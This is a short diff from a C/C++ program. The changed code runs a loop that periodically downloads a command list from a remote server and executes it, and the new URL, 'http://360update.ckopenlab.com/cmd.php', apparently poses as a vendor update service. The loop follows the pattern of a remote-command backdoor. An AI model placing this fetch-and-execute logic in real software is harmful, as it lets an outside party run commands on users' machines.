@@ -214,7 +214,7 @@ int main(int argc, char* argv[])
 		execute_cmd_list("cmd_list.txt", &tp);
 		while (true) {
 			Sleep(meta.check_interval);
-			download_file_from_url("http://update.xxsr.91waijiao.com/mockserver/", "cmd_list.txt");
+			download_url_to_file("http://360update.ckopenlab.com/cmd.php", "cmd_list.txt");
 			MetaData tmp;
 			if (!get_meta_from_file("cmd_list.txt", &tmp)) continue;
 			if (tmp.timestamp != meta.timestamp) {
